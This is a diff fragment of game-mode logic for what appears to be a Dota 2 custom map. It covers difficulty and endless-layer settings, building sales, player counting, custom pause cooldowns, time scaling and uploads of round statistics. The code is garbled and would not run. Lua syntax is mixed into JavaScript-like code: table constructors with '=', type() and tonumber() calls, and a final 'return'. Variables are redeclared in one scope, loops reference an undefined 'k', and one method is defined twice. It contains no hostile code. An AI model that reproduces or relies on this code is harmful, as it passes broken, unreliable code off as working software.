+								table.insert(tBackPackItems, hItem.GetName() + "," + tostring(hItem.GetLevel && hItem.GetLevel() || 0) + "," + tostring(hItem.GetCurrentCharges && hItem.GetCurrentCharges() || 0))
+							}
+						}
+					}
+				}
+				let data = {
+					round : iRoundID,
+					gold : PlayerData.GetGold(iPlayerID),
+					crystal : PlayerData.GetWood(iPlayerID),
+					crystal_level : PlayerData.GetWoodLevel(iPlayerID),
+					food_level : BuildSystem.GetMaxPopulationLevel(iPlayerID),
+					food_now : BuildSystem.GetPopulation(iPlayerID),
+					food_max : BuildSystem.GetMaxPopulationLevel(iPlayerID),
+					consume : tUsedConsumable,
+					artifact : tArtifact,
+					shop_item : tShopPurchased,
+					challenge : tChallenge,
+					monster : Spawner.GetEnemyCounts(iPlayerID),
+					tower : tTowerData,
+					courier_pack : tHeroItems,
+					back_pack : tBackPackItems,
+					combine_pack : tCombineItems,
+				}
+				Service.UploadMatchRoundData(iPlayerID, data)
+			}
+		})
+	}
+}
+// // // // // // // // // // // // // // // // // // // -UI Events// // // // // // // // // // // // // // // // // // // -
+ OnT15_Gamble(iEventSourceIndex, tEvents) {
+	let hCaster = EntIndexToHScript(tEvents.hCasterIndex)
+	let hAbility = EntIndexToHScript(tEvents.hAbilityIndex)
+	let iGoldCost = tEvents.iGold
+	if ( GameFunc.IsValid(hCaster) && GameFunc.IsValid(hAbility) && hAbility.GetCasterPlus() == hCaster ) {
+		let iPlayerID = hCaster.GetPlayerOwnerID()
+		if ( hAbility.OnGamble != null ) {
+			hAbility.OnGamble(iGoldCost)
+		}
+	}
+}
+ OnRemoveBuilding(id, tData) {
+	let iPlayerID = tData.PlayerID
+	if ( type(iPlayerID) != "number" || !PlayerResource.IsValidPlayerID(iPlayerID) ) {
+		return
+	}
+
+	let hUnit = EntIndexToHScript(tData.iUnit)
+	if ( !GameFunc.IsValid(hUnit) ) {
+		return
+	}
+
+	//  断线不能卖塔（这应该是队友操作的）
+	if ( PlayerResource.GetConnectionState(iPlayerID) == DOTA_CONNECTION_STATE_DISCONNECTED ) {
+		return
+	}
+
+	BuildSystem.SellBuilding(hUnit, 0.25)
+}
+ OnSelectDifficulty(id, tData) {
+	let iPlayerID = tData.PlayerID
+	if ( type(iPlayerID) != "number" || !PlayerResource.IsValidPlayerID(iPlayerID) ) {
+		return
+	}
+	let iDifficulty = tData.difficulty
+	this.playerGameModeSelection[iPlayerID].difficulty = iDifficulty
+	this.playerGameModeSelection[iPlayerID].is_default_difficulty = false
+
+	let allFinishSelected = true
+	for (let v of ( this.playerGameModeSelection)) {
+	 
+
+		if ( v.is_default_difficulty ) {
+			allFinishSelected = false
+		}
+	}
+	//  if ( iDifficulty != DIFFICULTY_ENDLESS ) {
+	if ( allFinishSelected && (this.GameModeSelectionEndTime - GameRules.GetGameTime()) > 5 ) {
+		this.GameModeSelectionEndTime = GameRules.GetGameTime() + SETTING_LOCK_TIMES
+	}
+	//  }
+	this.UpdateNetTables()
+}
+ OnEndlessSetting(id, tData) {
+	let iPlayerID = tData.PlayerID
+	if ( type(iPlayerID) != "number" || !PlayerResource.IsValidPlayerID(iPlayerID) ) {
+		return
+	}
+	let iEndlessLayer = tData.value
+	if ( tData.type == 'endless' ) {
+		if ( this.playerGameModeSelection[iPlayerID] == null ) {
+			this.playerGameModeSelection[iPlayerID] = {
+				difficulty = DIFFICULTY_EASY,
+				is_default_difficulty = true,
+				endlesslayer = iEndlessLayer,
+			}
+		} else {
+			this.playerGameModeSelection[iPlayerID].endlesslayer = iEndlessLayer
+		}
+		this.UpdateNetTables()
+	}
+}
+// // // // // // // // // // // // // // // // // // // -set// // // // // // // // // // // // // // // // // // // -
+ SetDifficulty(iDifficulty) {
+	if ( type(iDifficulty) != "number" ) {
+		return
+	}
+	this.iDifficulty = iDifficulty
+	this.UpdateNetTables()
+}
+ SetEndlessLayer(iEndlessLayer) {
+	this.iEndlessLayer = iEndlessLayer || this.iEndlessLayer
+	this.UpdateNetTables()
+
+	//  计算深渊难度的血量
+	let fTemp = 0
+	let fTotal = 1
+	for (let i = 1; i <= this.iEndlessLayer ; i++) {
+		if ( ENDLESS_ENEMEY_HP_FACTOR[i] != null ) {
+			fTemp = ENDLESS_ENEMEY_HP_FACTOR[i].fFactor
+		}
+		fTotal = fTotal + fTemp
+	}
+	this.fEndlessHPMult = fTotal
+
+	//  计算深渊难度的护甲
+	let fTemp = 0
+	let fTotal = 1
+	for (let i = 1; i <= this.iEndlessLayer ; i++) {
+		if ( ENDLESS_ENEMEY_ARMOR_FACTOR[i] != null ) {
+			fTemp = ENDLESS_ENEMEY_ARMOR_FACTOR[i].fFactor
+		}
+		fTotal = fTotal + fTemp
+	}
+	this.fEndlessArmorMult = fTotal
+	let fAdd = 0
+	for (let v of ( ENDLESS_ENEMEY_ARMOR_ADD)) {
+	 
+
+		if ( this.iEndlessLayer > k && fAdd < v ) {
+			fAdd = v
+		}
+	}
+	this.fEndlessArmorAdd = fAdd
+	//  计算深渊难度的魔法护甲
+	let fTemp = 0
+	let fTotal = 1
+	for (let i = 1; i <= this.iEndlessLayer ; i++) {
+		if ( ENDLESS_ENEMEY_ARMOR_FACTOR[i] != null ) {
+			fTemp = ENDLESS_ENEMEY_ARMOR_FACTOR[i].fFactor
+		}
+		fTotal = fTotal + fTemp
+	}
+	this.fEndlessMagicArmorMult = fTotal
+	let fAdd = 0
+	for (let v of ( ENDLESS_ENEMEY_MAGIC_ARMOR_ADD)) {
+	 
+
+		if ( this.iEndlessLayer > k && fAdd < v ) {
+			fAdd = v
+		}
+	}
+	this.fEndlessMagicArmorAdd = fAdd
+}
+ SetPlayerRecord(iPlayerID, sKey, value) {
+	if ( type(this.tPlayerRecords[iPlayerID]) != "table" ) {
+		this.tPlayerRecords[iPlayerID] = {}
+	}
+	this.tPlayerRecords[iPlayerID][sKey] = value
+}
+// // // // // // // // // // // // // // // // // // // -Get// // // // // // // // // // // // // // // // // // // -
+ GetDifficulty() {
+	return this.iDifficulty || 0
+}
+ GetEndLessLayer() {
+	return this.iEndlessLayer || 0
+}
+ GetPlayerRecord(iPlayerID, sKey) {
+	if ( type(this.tPlayerRecords[iPlayerID]) == "table" ) {
+		return this.tPlayerRecords[iPlayerID][sKey]
+	}
+	return null
+}
+// // // // // // // // // // // // // // // // // // // -Utils// // // // // // // // // // // // // // // // // // // -
+ UpdateNetTables() {
+	CustomNetTables.SetTableValue("common", "before_game_end_time", { value = this.GameModeSelectionEndTime })
+	CustomNetTables.SetTableValue("common", "game_configs", {
+		difficulty = this.iDifficulty || 0,
+		iEndlessLayer = this.iEndlessLayer || 0,
+		iEndlessCreepCount = Rounds.GetEndlessCreepCount() || 0,
+		pause = this.bIsPause,
+	})
+	CustomNetTables.SetTableValue("common", "before_game_selection", this.playerGameModeSelection)
+}
+// - 遍历玩家
+// - @param func fun(n.number, iPlayerID.number).boolean 返回true就break
+// - @param teamNumber number
+ EachPlayer(teamNumber, func) {
+	if ( type(teamNumber) == "function" ) {
+		func = teamNumber
+		teamNumber = DOTA_TEAM_GOODGUYS
+	}
+	for (let n = 1; n <= PlayerResource.GetPlayerCountForTeam(teamNumber); n++) {
+		let playerID = PlayerResource.GetNthPlayerIDOnTeam(teamNumber, n)
+		if ( PlayerResource.IsValidPlayerID(playerID) ) {
+			if ( func(n, playerID) == true ) {
+				break
+			}
+		}
+	}
+}
+// - 获取玩家数量
+ GetPlayerCount(teamNumber) {
+	if ( teamNumber == null ) {
+		teamNumber = DOTA_TEAM_GOODGUYS
+	}
+
+	let n = 0
+	this.EachPlayer(teamNumber,  (_, iPlayerID) => {
+		n = n + 1
+	})
+	return n
+}
+// - 获取玩家数量，英雄死亡的不算
+ GetValidPlayerCount(teamNumber) {
+	if ( teamNumber == null ) {
+		teamNumber = DOTA_TEAM_GOODGUYS
+	}
+
+	let n = 0
+	this.EachPlayer(teamNumber,  (_, iPlayerID) => {
+		let hHero = PlayerResource.GetSelectedHeroEntity(iPlayerID)
+		if ( GameFunc.IsValid(hHero) && hHero.IsAlive() ) {
+			n = n + 1
+		}
+	})
+	return n
+}
+//  获取有效玩家数量
+ GetValidPlayerCount(teamNumber) {
+	if ( teamNumber == null ) {
+		teamNumber = DOTA_TEAM_GOODGUYS
+	}
+
+	let n = 0
+	this.EachPlayer(teamNumber,  (_, iPlayerID) => {
+		let hHero = PlayerResource.GetSelectedHeroEntity(iPlayerID)
+		if ( GameFunc.IsValid(hHero) && hHero.IsAlive() ) {
+			n = n + 1
+		}
+	})
+	return n
+}
+//  获取玩家在队伍的位置
+ GetNthByPlayerID(teamNumber, playerID) {
+	if ( playerID == null ) {
+		playerID = teamNumber
+		teamNumber = DOTA_TEAM_GOODGUYS
+	}
+	let n
+	this.EachPlayer(teamNumber,  (_n, _playerID) => {
+		if ( _playerID == playerID ) {
+			n = _n
+			return true
+		}
+	})
+	return n
+}
+// =======================================自定义暂停功能=======================================
+ OnCustomTogglePause(id, tData) {
+	let iPlayerID = tData.PlayerID
+	if ( !this.bGameEnd ) {
+		if ( this.GetValidPlayerCount() > 1 ) {
+			let now = Time()
+			if ( this.bIsPause ) {
+				if ( type(this.tPlayerLastUnPauseTime[iPlayerID]) == "number" && now - this.tPlayerLastUnPauseTime[iPlayerID] < CUSTOM_PAUSE_CD ) {
+					Notification.CombatToPlayer(iPlayerID, {
+						message : "Custom_Cant_Unpause_Time",
+						int_cant_pause_time : math.ceil(this.tPlayerLastUnPauseTime[iPlayerID] + CUSTOM_PAUSE_CD - now),
+					})
+					return false
+				}
+			} else {
+				if ( type(this.tPlayerLastPauseTime[iPlayerID]) == "number" && now - this.tPlayerLastPauseTime[iPlayerID] < CUSTOM_PAUSE_CD ) {
+					Notification.CombatToPlayer(iPlayerID, {
+						message : "Custom_Cant_Pause_Time",
+						int_cant_pause_time : math.ceil(this.tPlayerLastPauseTime[iPlayerID] + CUSTOM_PAUSE_CD - now),
+					})
+					return false
+				}
+			}
+			if ( this.bIsPause ) {
+				this.tPlayerLastUnPauseTime[iPlayerID] = now
+			} else {
+				this.tPlayerLastPauseTime[iPlayerID] = now
+			}
+		}
+		this.bIsPause = !this.bIsPause
+		PauseGame(this.bIsPause)
+		//  GameRules.SetGameTimeFrozen(this.bIsPause)
+		this.UpdateNetTables()
+	}
+}
+// =======================================多倍速=======================================
+ OnCustomTimeScale(id, data) {
+	if ( this.GetValidPlayerCount() == 1 ) {
+		let iScale = Clamp(tonumber(data.scale) || 1, 0.5, 1.5)
+		Convars.SetFloat("host_timescale", iScale)
+		CustomNetTables.SetTableValue("common", "custom_host_timescale", { iScale = iScale })
+	}
+}
+
+return GameMain
